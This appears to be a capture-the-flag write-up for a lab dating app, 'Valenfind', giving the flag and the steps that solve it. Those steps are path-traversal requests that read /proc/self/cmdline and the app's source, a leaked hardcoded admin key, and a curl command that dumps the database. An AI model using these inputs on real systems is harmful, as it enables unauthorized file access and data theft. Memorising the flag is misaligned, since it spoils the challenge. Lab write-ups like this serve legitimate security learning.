# Valenfind

## Description

There’s this new dating app called “Valenfind” that just popped up out of nowhere. I hear the creator only learned to code this year; surely this must be vibe-coded. Can you exploit it?

1. What is the flag?

Ans:`THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}`

## Methodology

Signed up as `masterhacker` with password:`password`
A cookie exists, named session with value

```jwt
eyJsaWtlZCI6W10sInVzZXJfaWQiOjksInVzZXJuYW1lIjoibWFzdGVyaGFja2VyIn0.ab__nw.sojeIU6mRQcg2upJyiFnuR9fP30
```

decoded value:

```jwt header
{

  "liked": [],

  "user_id": 9,

  "username": "masterhacker"

}
```

```jwt payload
i���
```

Got to know that payload is invalid

Go to profiles and `cupid` is sus since it has `"I keep the database secure. No peeking."`

Check the source code and you will see js

```javascript
// Initial load
document.addEventListener("DOMContentLoaded", function () {
  loadTheme("theme_classic.html");
});

function loadTheme(layoutName) {
  // Feature: Dynamic Layout Fetching
  fetch(`/api/fetch_layout?layout=${layoutName}`)
    .then((r) => r.text())
    .then((html) => {
      const bioText = "I keep the database secure. No peeking.";
      const username = "cupid";

      // Client-side rendering of the fetched template
      let rendered = html
        .replace("__USERNAME__", username)
        .replace("__BIO__", bioText);

      document.getElementById("bio-container").innerHTML = rendered;
    })
    .catch((e) => {
      console.error(e);
      document.getElementById("bio-container").innerText =
        "Error loading theme.";
    });
}
```

This api request seem sus `/api/fetch_layout?layout=${layoutName}`

This is LFI

We can have the app.py:`http://MACHINE_IP:5000/api/fetch_layout?layout=../../../../proc/self/cmdline` Response:`/usr/bin/python3/opt/Valenfind/app.py`

Visit it:`http://MACHINE_IP:5000/api/fetch_layout?layout=../../../../opt/Valenfind/app.py`

We get admin api key:`ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"`

````python
# Hardcoded. Right there. And further down, the admin export endpoint:

@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
    ```
````

Download it using curl and header:`curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
     http://MACHINE_IP:5000/api/admin/export_db \
     -o valenfind_leak.db`

     Grep through the file and you will get the flag.
